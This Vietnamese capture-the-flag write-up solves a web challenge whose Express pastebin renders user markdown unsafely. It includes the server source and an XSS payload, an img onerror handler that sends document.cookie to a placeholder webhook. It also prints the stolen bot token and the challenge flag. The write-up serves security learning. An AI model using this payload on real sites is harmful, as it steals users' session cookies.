# Đề bài:
![Screenshot (468)](https://github.com/ductohno/ehc-adward/assets/152991010/3028b1bc-7812-4bb3-9103-fac00d33e608)

- Giao diện trang web:

![Screenshot (469)](https://github.com/ductohno/ehc-adward/assets/152991010/9b23ac9d-4b99-4bf4-8c46-a37306f0a941)
# Source: 
```
const crypto = require('crypto')

const express = require('express')
const app = express()

const posts = new Map()

app.use(express.urlencoded({ extended: false }))

app.get('/', (_req, res) => {
    const placeholder = [
        '# Note title',
        'Content of the note. You can use *italics*!',
    ].join('\n')

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>Pastebin</h1>
            <form action="/create" method="POST">
                <textarea name="content">${placeholder}</textarea>
                <button type="submit">Create</button>
            </form>
        </div>
    `)
})

app.get('/flag', (req, res) => {
    const cookie = req.headers.cookie ?? ''
    res.type('text/plain').end(
        cookie.includes(process.env.TOKEN)
        ? process.env.FLAG
        : 'no flag for you'
    )
})

app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
})

app.post('/create', (req, res) => {
    const data = req.body.content ?? ''
    const id = crypto.randomBytes(8).toString('hex')
    posts.set(id, data)
    res.redirect(`/view/${id}`)
})

app.get('/content/:id', (req, res) => {
    const id = req.params.id
    const data = posts.get(id) ?? ''
    res.type('text/plain').end(data)
})

app.get('/style.css', (_req, res) => {
    res.type('text/css').end(`
        * {
          font-family: system-ui, -apple-system, BlinkMacSystemFont,
            'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
          box-sizing: border-box;
        }

        html,
        body {
          margin: 0;
        }

        .content {
          padding: 2rem;
          width: 90%;
          max-width: 900px;
          margin: auto;
        }

        input:not([type='submit']) {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
        }

        textarea {
          width: 100%;
          padding: 8px;
          margin: 8px 0;
          resize: vertical;
          font-family: monospace;
        }

        input[type='submit'] {
          margin-bottom: 16px;
        }


    `)
})

app.listen(3000)
```
# Hướng làm: 
- Nhìn bài này thì em nghĩ ngay đến xss vì theo như code, ta cần có cookie để vào được path /flag để lấy flag, thử thôi
# Khai thác:
- Trước tiên vẫn là phải thử:
![Screenshot (470)](https://github.com/ductohno/ehc-adward/assets/152991010/6e9af75e-619b-485f-986e-f2193081cef3)
- Và ngay lập thức thông báo hiện ra:
![Screenshot (471)](https://github.com/ductohno/ehc-adward/assets/152991010/73478682-da8e-46cb-9b43-1c1bf932e335)
- Xss confirm, giờ chúng ta sẽ chuyển payload thành ```<img src=0 onerror='document.location="Your_Link(webhook)?cmd="+document.cookie'/>``` để chuyển hướng
- Nên bật sẵn burp suite
- Sau khi bấm submit thì gửi link đó cho con bot

![Screenshot (472)](https://github.com/ductohno/ehc-adward/assets/152991010/5a711dda-9a77-4844-b6c5-349d005a88d0)

- Ta nhận được token:

![Screenshot (473)](https://github.com/ductohno/ehc-adward/assets/152991010/00d3670e-544d-4afc-9f3b-dbb30da68be6)

- token=d15453b0234690ccbb91861e
- Giờ thì truy cập vô /flag và dùng token kia là cookie

![Screenshot (474)](https://github.com/ductohno/ehc-adward/assets/152991010/1af54793-aae7-4cbe-b9cb-091699bbe520)

# Flag:
actf{b534186fa8b28780b1fcd1e95e2a2e2c}


